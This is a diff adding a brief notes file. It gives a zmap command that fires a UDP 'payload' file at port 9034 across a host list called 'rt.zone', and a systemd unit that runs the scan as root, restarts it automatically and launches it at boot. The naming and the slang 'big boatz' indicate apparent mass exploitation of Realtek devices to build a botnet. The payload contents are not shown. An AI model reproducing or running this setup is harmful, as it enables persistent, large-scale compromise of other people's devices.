@@ -1,0 +1,26 @@
+zmap -p9034 -Mudp -wrt.zone --probe-args=file:payload -T5
+big boatz
+
+
+
+
+
+
+ubuntu systemd:
+
+sudo vi /etc/systemd/system/realtek-zmap.service
+
+[Unit]
+Description=Realtek ZMap UDP Scan
+After=network.target
+
+[Service]
+ExecStart=/bin/bash -c 'zmap -p9034 -M udp -w rt.zone --probe-args=file:payload -T5'
+WorkingDirectory=/root/realtek
+User=root
+Restart=always
+RestartSec=5
+Environment=PATH=/usr/bin:/usr/local/bin:/sbin:/bin
+
+[Install]
+WantedBy=multi-user.target
